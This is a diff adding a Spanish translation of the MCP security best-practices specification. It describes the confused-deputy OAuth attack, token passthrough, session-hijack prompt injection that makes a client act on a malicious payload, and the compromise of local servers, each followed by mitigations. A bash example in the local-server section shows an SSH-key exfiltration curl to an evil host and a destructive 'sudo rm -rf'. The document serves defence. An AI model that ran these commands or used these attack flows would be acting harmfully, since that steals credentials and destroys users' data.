@@ -1,0 +1,331 @@
+---
+title: Prácticas recomendadas de seguridad
+---
+
+<div id="enable-section-numbers" />
+
+<div id="introduction">
+  ## Introducción
+</div>
+
+<div id="purpose-and-scope">
+  ### Propósito y alcance
+</div>
+
+Este documento presenta consideraciones de seguridad para el Protocolo de Contexto de Modelo (MCP), y complementa la especificación de [Autorización de MCP](es/../basic/authorization.mdx). Identifica riesgos de seguridad, vectores de ataque y mejores prácticas específicas para implementaciones de MCP.
+
+El público principal de este documento incluye a desarrolladores que implementan flujos de autorización de MCP, operadores de Servidores MCP y profesionales de la seguridad que evalúan sistemas basados en MCP. Este documento debe leerse junto con la especificación de Autorización de MCP y las [mejores prácticas de seguridad de OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc9700).
+
+<div id="attacks-and-mitigations">
+  ## Ataques y mitigaciones
+</div>
+
+Esta sección describe en detalle los ataques contra implementaciones de MCP, junto con posibles contramedidas.
+
+<div id="confused-deputy-problem">
+  ### Problema del delegado confundido
+</div>
+
+Los atacantes pueden explotar servidores MCP que actúan como proxy de otros servidores de recursos, creando vulnerabilidades de [«delegado confundido»](https://en.wikipedia.org/wiki/Confused_deputy_problem).
+
+<div id="terminology">
+  #### Terminología
+</div>
+
+**Servidor proxy MCP**
+: Un Servidor MCP que conecta Clientes MCP con API de terceros, ofreciendo funciones MCP mientras delega operaciones y actúa como un único cliente OAuth ante el servidor de API de terceros.
+
+**Servidor de autorización de terceros**
+: Servidor de autorización que protege la API de terceros. Puede carecer de compatibilidad con registro dinámico de clientes, lo que obligaría al proxy MCP a usar un ID de cliente estático para todas las solicitudes.
+
+**API de terceros**
+: El servidor de recursos protegido que proporciona la funcionalidad real de la API. El acceso a esta API requiere tokens emitidos por el servidor de autorización de terceros.
+
+**ID de cliente estático**
+: Un identificador de cliente de OAuth 2.0 fijo que usa el servidor proxy MCP al comunicarse con el servidor de autorización de terceros. Este ID de cliente se refiere al Servidor MCP que actúa como cliente de la API de terceros. Es el mismo valor para todas las interacciones del Servidor MCP con la API de terceros, independientemente de qué Cliente MCP iniciara la solicitud.
+
+<div id="architecture-and-attack-flows">
+  #### Arquitectura y flujos de ataques
+</div>
+
+<div id="normal-oauth-proxy-usage-preserves-user-consent">
+  ##### Uso normal de proxy OAuth (preserva el consentimiento del usuario)
+</div>
+
+```mermaid
+sequenceDiagram
+    participant UA as Agente de usuario (navegador)
+    participant MC as Cliente MCP
+    participant M as Servidor proxy MCP
+    participant TAS as Servidor de autorización de terceros
+
+    Note over UA,M: Flujo de autenticación inicial completado
+
+    Note over UA,TAS: Paso 1: Consentimiento válido del usuario para el servidor de terceros
+
+    M->>UA: Redirigir al servidor de autorización de terceros
+    UA->>TAS: Solicitud de autorización (client_id: mcp-proxy)
+    TAS->>UA: Pantalla de consentimiento de autorización
+    Note over UA: Revisar la pantalla de consentimiento
+    UA->>TAS: Aprobar
+    TAS->>UA: Establecer cookie de consentimiento para el ID de cliente: mcp-proxy
+    TAS->>UA: Código de autorización de terceros + redirección a mcp-proxy-server.com
+    UA->>M: Código de autorización de terceros
+    Note over M,TAS: Intercambiar el código de terceros por un token de terceros
+    Note over M: Generar código de autorización de MCP
+    M->>UA: Redirigir al Cliente MCP con el código de autorización de MCP
+
+    Note over M,UA: Intercambiar código por token, etc.
+```
+
+<div id="malicious-oauth-proxy-usage-skips-user-consent">
+  ##### Uso malicioso de un proxy OAuth (omite el consentimiento del usuario)
+</div>
+
+```mermaid
+sequenceDiagram
+    participant UA as User-Agent (Navegador)
+    participant M as Servidor proxy MCP
+    participant TAS as Servidor de autorización de terceros
+    participant A as Atacante
+
+
+    Note over UA,A: Paso 2: Ataque (aprovechando una cookie existente, omitiendo el consentimiento)
+    A->>M: Registra dinámicamente un cliente malicioso, redirect_uri: attacker.com
+    A->>UA: Envía un enlace malicioso
+    UA->>TAS: Solicitud de autorización (client_id: mcp-proxy) + cookie de consentimiento
+    rect rgba(255, 17, 0, 0.67)
+    TAS->>TAS: Cookie presente, consentimiento omitido
+    end
+
+   TAS->>UA: Código de autorización de terceros + redirección a mcp-proxy-server.com
+   UA->>M: Código de autorización de terceros
+   Note over M,TAS: Intercambia el código de terceros por un token de terceros
+   Note over M: Genera un código de autorización MCP
+   M->>UA: Redirige a attacker.com con el código de autorización MCP
+   UA->>A: Código de autorización MCP entregado a attacker.com
+   Note over M,A: El atacante intercambia el código MCP por un token MCP
+   A->>M: El atacante suplanta al usuario ante el servidor MCP
+```
+
+<div id="attack-description">
+  #### Descripción del ataque
+</div>
+
+Cuando un servidor proxy MCP usa un ID de cliente estático para autenticarse ante un servidor de autorización de terceros que no admite el registro dinámico de clientes, el siguiente ataque se vuelve posible:
+
+1. Un usuario se autentica normalmente a través del servidor proxy MCP para acceder a la API de terceros
+2. Durante este flujo, el servidor de autorización de terceros establece una cookie en el agente de usuario que indica el consentimiento para el ID de cliente estático
+3. Posteriormente, un atacante envía al usuario un enlace malicioso que contiene una solicitud de autorización manipulada, la cual incluye un URI de redirección malicioso junto con un nuevo ID de cliente registrado dinámicamente
+4. Cuando el usuario hace clic en el enlace, su navegador aún conserva la cookie de consentimiento de la solicitud legítima anterior
+5. El servidor de autorización de terceros detecta la cookie y omite la pantalla de consentimiento
+6. El código de autorización de MCP se redirige al servidor del atacante (especificado en el parámetro malicioso `redirect_uri` durante el [registro dinámico de clientes](/es/specification/draft/basic/authorization#dynamic-client-registration))
+7. El atacante canjea el código de autorización robado por tokens de acceso para el servidor MCP sin la aprobación explícita del usuario
+8. El atacante ahora tiene acceso a la API de terceros como el usuario comprometido
+
+<div id="mitigation">
+  #### Mitigación
+</div>
+
+Los servidores proxy de MCP que usen ID de cliente estáticos **DEBEN** obtener el consentimiento del usuario para cada cliente registrado dinámicamente antes de reenviar la solicitud a servidores de autorización de terceros (que podrían requerir un consentimiento adicional).
+
+<div id="token-passthrough">
+  ### Transferencia de tokens
+</div>
+
+La &quot;transferencia de tokens&quot; es un antipatrón en el que un Servidor MCP acepta tokens de un Cliente MCP sin validar que los tokens hayan sido emitidos correctamente para el Servidor MCP y los reenvía a la API downstream.
+
+<div id="risks">
+  #### Riesgos
+</div>
+
+El traspaso de tokens está explícitamente prohibido en la [especificación de autorización](/es/specification/draft/basic/authorization) porque introduce varios riesgos de seguridad, entre ellos:
+
+* **Elusión de controles de seguridad**
+  * El Servidor MCP o las API de downstream podrían implementar controles de seguridad importantes como limitación de tasa, validación de solicitudes o monitoreo de tráfico, que dependen de la audiencia del token u otras restricciones de credenciales. Si los clientes pueden obtener y usar tokens directamente con las API de downstream sin que el Servidor MCP los valide correctamente o garantice que los tokens estén emitidos para el servicio adecuado, se eludirán estos controles.
+* **Problemas de responsabilidad y trazabilidad**
+  * El Servidor MCP no podrá identificar ni distinguir entre Clientes MCP cuando estos llamen con un token de acceso emitido upstream que puede ser opaco para el Servidor MCP.
+  * Los registros del Servidor de Recursos de downstream pueden mostrar solicitudes que parecen provenir de una fuente distinta, con una identidad diferente, en lugar del Servidor MCP que realmente está reenviando los tokens.
+  * Ambos factores dificultan la investigación de incidentes, la aplicación de controles y las auditorías.
+  * Si el Servidor MCP pasa tokens sin validar sus afirmaciones (p. ej., roles, privilegios o audiencia) u otros metadatos, un actor malicioso en posesión de un token robado puede usar el servidor como proxy para exfiltrar datos.
+* **Problemas en los límites de confianza**
+  * El Servidor de Recursos de downstream concede confianza a entidades específicas. Esta confianza puede incluir suposiciones sobre el origen o los patrones de comportamiento del cliente. Romper este límite de confianza podría provocar problemas inesperados.
+  * Si el token es aceptado por varios servicios sin la validación adecuada, un atacante que comprometa uno de ellos puede usar el token para acceder a otros servicios conectados.
+* **Riesgo de compatibilidad futura**
+  * Incluso si hoy un Servidor MCP actúa como un “proxy puro”, más adelante podría necesitar agregar controles de seguridad. Empezar con una separación adecuada de audiencias de tokens facilita la evolución del modelo de seguridad.
+
+<div id="mitigation">
+  #### Mitigación
+</div>
+
+Los servidores MCP **NO DEBEN** aceptar ningún token que no haya sido emitido explícitamente para el servidor MCP.
+
+<div id="session-hijacking">
+  ### Secuestro de sesión
+</div>
+
+El secuestro de sesión es un vector de ataque en el que el servidor proporciona a un cliente un ID de sesión, y una parte no autorizada logra obtener y utilizar ese mismo ID de sesión para hacerse pasar por el cliente original y realizar acciones no autorizadas en su nombre.
+
+<div id="session-hijack-prompt-injection">
+  #### Inyección de indicaciones para secuestrar la sesión
+</div>
+
+```mermaid
+sequenceDiagram
+    participant Client
+    participant ServerA
+    participant Queue
+    participant ServerB
+    participant Attacker
+
+    Client->>ServerA: Inicializar (conectar a servidor HTTP transmitible)
+    ServerA-->>Client: Responder con ID de sesión
+
+    Attacker->>ServerB: Acceder/adivinar ID de sesión
+    Note right of Attacker: El atacante conoce/adivina el ID de sesión
+
+    Attacker->>ServerB: Disparar evento (carga maliciosa, usando el ID de sesión)
+    ServerB->>Queue: Encolar evento (clave: ID de sesión)
+
+    ServerA->>Queue: Sondear eventos (usando el ID de sesión)
+    Queue-->>ServerA: Datos del evento (carga maliciosa)
+
+    ServerA-->>Client: Respuesta asíncrona (carga maliciosa)
+    Client->>Client: Actúa según la carga maliciosa
+```
+
+<div id="session-hijack-impersonation">
+  #### Suplantación por secuestro de sesión
+</div>
+
+```mermaid
+sequenceDiagram
+    participant Cliente
+    participant Servidor
+    participant Atacante
+
+    Cliente->>Servidor: Inicializar (iniciar sesión/autenticarse)
+    Servidor-->>Cliente: Responder con ID de sesión (sesión persistente creada)
+
+    Atacante->>Servidor: Acceder/adivinar el ID de sesión
+    Note right of Atacante: El atacante conoce/adivina el ID de sesión
+
+    Atacante->>Servidor: Hacer una llamada a la API (usando el ID de sesión, sin reautenticación)
+    Servidor-->>Atacante: Responder como si el atacante fuera el cliente (secuestro de sesión)
+```
+
+<div id="attack-description">
+  #### Descripción del ataque
+</div>
+
+Cuando hay múltiples servidores HTTP con estado que manejan solicitudes MCP, son posibles los siguientes vectores de ataque:
+
+**Inyección de indicaciones mediante secuestro de sesión**
+
+1. El cliente se conecta al **Servidor A** y recibe un ID de sesión.
+
+2. El atacante obtiene un ID de sesión existente y envía un evento malicioso al **Servidor B** con dicho ID de sesión.
+   * Cuando un servidor admite [reentrega/transmisiones reanudables](/es/specification/draft/basic/transports#resumability-and-redelivery), terminar deliberadamente la solicitud antes de recibir la respuesta podría hacer que el cliente original la reanude mediante la solicitud GET para eventos enviados por el servidor.
+   * Si un servidor en particular inicia eventos enviados por el servidor como consecuencia de una llamada de Herramienta como `notifications/tools/list_changed`, donde es posible afectar las Herramientas que ofrece el servidor, un cliente podría terminar con Herramientas que no sabía que estaban habilitadas.
+
+3. El **Servidor B** encola el evento (asociado con el ID de sesión) en una cola compartida.
+
+4. El **Servidor A** consulta la cola de eventos usando el ID de sesión y recupera la carga maliciosa.
+
+5. El **Servidor A** envía la carga maliciosa al cliente como una respuesta asíncrona o reanudada.
+
+6. El cliente recibe y actúa sobre la carga maliciosa, lo que puede conllevar a una posible intrusión.
+
+**Suplantación mediante secuestro de sesión**
+
+1. El Cliente MCP se autentica con el Servidor MCP, creando un ID de sesión persistente.
+2. El atacante obtiene el ID de sesión.
+3. El atacante realiza llamadas al Servidor MCP usando el ID de sesión.
+4. El Servidor MCP no verifica autorización adicional y trata al atacante como un usuario legítimo, permitiendo acceso o acciones no autorizadas.
+
+<div id="mitigation">
+  #### Mitigación
+</div>
+
+Para prevenir el secuestro de sesión y los ataques de inyección de eventos, se deben implementar las siguientes medidas:
+
+Los servidores MCP que implementen autorización **DEBEN** verificar todas las solicitudes entrantes.
+Los servidores MCP **NO DEBEN** usar sesiones para autenticación.
+
+Los servidores MCP **DEBEN** usar identificadores de sesión seguros y no deterministas.
+Los identificadores de sesión generados (p. ej., UUID) **DEBERÍAN** usar generadores de números aleatorios seguros. Evita identificadores de sesión predecibles o secuenciales que un atacante podría adivinar. Rotar o expirar los identificadores de sesión también puede reducir el riesgo.
+
+Los servidores MCP **DEBERÍAN** vincular los identificadores de sesión a información específica del usuario.
+Al almacenar o transmitir datos relacionados con la sesión (p. ej., en una cola), combina el identificador de sesión con información única del usuario autorizado, como su ID de usuario interno. Usa un formato de clave como `<user_id>:<session_id>`. Esto garantiza que, incluso si un atacante adivina un identificador de sesión, no pueda hacerse pasar por otro usuario, ya que el ID de usuario se deriva del token del usuario y no lo proporciona el cliente.
+
+Los servidores MCP pueden, opcionalmente, aprovechar identificadores únicos adicionales.
+
+<div id="local-mcp-server-compromise">
+  ### Compromiso de servidores MCP locales
+</div>
+
+Los servidores MCP locales son Servidores MCP que se ejecutan en la máquina local de un usuario, ya sea porque el usuario descarga y ejecuta un servidor, desarrolla uno por su cuenta o lo instala mediante los flujos de configuración de un cliente. Estos servidores pueden tener acceso directo al sistema del usuario y pueden ser accesibles para otros procesos que se estén ejecutando en la máquina del usuario, lo que los convierte en objetivos atractivos para ataques.
+
+<div id="attack-description">
+  #### Descripción del ataque
+</div>
+
+Los servidores MCP locales son binarios que se descargan y ejecutan en la misma máquina que el cliente MCP. Sin un aislamiento adecuado y sin requisitos de consentimiento, los siguientes ataques se vuelven posibles:
+
+1. Un atacante incluye un comando de inicio malicioso en la configuración de un cliente
+2. Un atacante distribuye una carga útil maliciosa dentro del propio servidor
+3. Un atacante accede a un servidor local inseguro que quedó ejecutándose en localhost mediante DNS rebinding
+
+Ejemplos de comandos de inicio maliciosos que podrían incrustarse:
+
+```bash
+# Exfiltración de datos
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
+
+# Escalada de privilegios
+sudo rm -rf /important/system/files && echo "MCP server installed!"
+```
+
+<div id="risks">
+  #### Riesgos
+</div>
+
+Los servidores MCP locales con restricciones inadecuadas o provenientes de fuentes no confiables introducen varios riesgos de seguridad críticos:
+
+* **Ejecución arbitraria de código**. Los atacantes pueden ejecutar cualquier comando con los privilegios del cliente MCP.
+* **Falta de visibilidad**. Los usuarios no tienen información sobre qué comandos se están ejecutando.
+* **Ofuscación de comandos**. Actores maliciosos pueden usar comandos complejos o enrevesados para aparentar legitimidad.
+* **Exfiltración de datos**. Los atacantes pueden acceder a servidores MCP locales legítimos mediante JavaScript comprometido.
+* **Pérdida de datos**. Atacantes o errores en servidores legítimos podrían provocar una pérdida de datos irrecuperable en la máquina anfitriona.
+
+<div id="mitigation">
+  #### Mitigación
+</div>
+
+Si un cliente MCP admite la configuración con un clic de un servidor MCP local, **DEBE** implementar mecanismos de consentimiento adecuados antes de ejecutar comandos.
+
+**Consentimiento previo a la configuración**
+
+Mostrar un cuadro de diálogo de consentimiento claro antes de conectar un nuevo servidor MCP local mediante configuración con un clic. El cliente MCP **DEBE**:
+
+* Mostrar el comando exacto que se ejecutará, sin truncarlo (incluidos argumentos y parámetros)
+* Identificar claramente que es una operación potencialmente peligrosa que ejecuta código en el sistema del usuario
+* Requerir la aprobación explícita del usuario antes de proceder
+* Permitir a los usuarios cancelar la configuración
+
+El cliente MCP **DEBERÍA** implementar comprobaciones y protecciones adicionales para mitigar posibles vectores de ataque de ejecución de código:
+
+* Resaltar patrones de comandos potencialmente peligrosos (p. ej., comandos que contengan `sudo`, `rm -rf`, operaciones de red, acceso al sistema de archivos fuera de los directorios esperados)
+* Mostrar advertencias para comandos que accedan a ubicaciones sensibles (directorio de inicio, claves SSH, directorios del sistema)
+* Advertir que los servidores MCP se ejecutan con los mismos privilegios que el cliente
+* Ejecutar comandos del servidor MCP en un entorno aislado con privilegios predeterminados mínimos
+* Iniciar servidores MCP con acceso restringido al sistema de archivos, la red y otros recursos del sistema
+* Proporcionar mecanismos para que los usuarios otorguen explícitamente privilegios adicionales (p. ej., acceso a directorios específicos, acceso a la red) cuando sea necesario
+* Usar tecnologías de aislamiento apropiadas para la plataforma (contenedores, chroot, sandboxes de aplicaciones, etc.)
+
+Los servidores MCP que estén pensados para ejecutarse localmente **DEBERÍAN** implementar medidas para prevenir el uso no autorizado por procesos maliciosos:
+
+* Usar el transporte `stdio` para limitar el acceso únicamente al cliente MCP
+* Restringir el acceso si se usa un transporte HTTP, por ejemplo:
+  * Requerir un token de autorización
+  * Usar sockets de dominio Unix u otros mecanismos de comunicación entre procesos (IPC) con acceso restringido
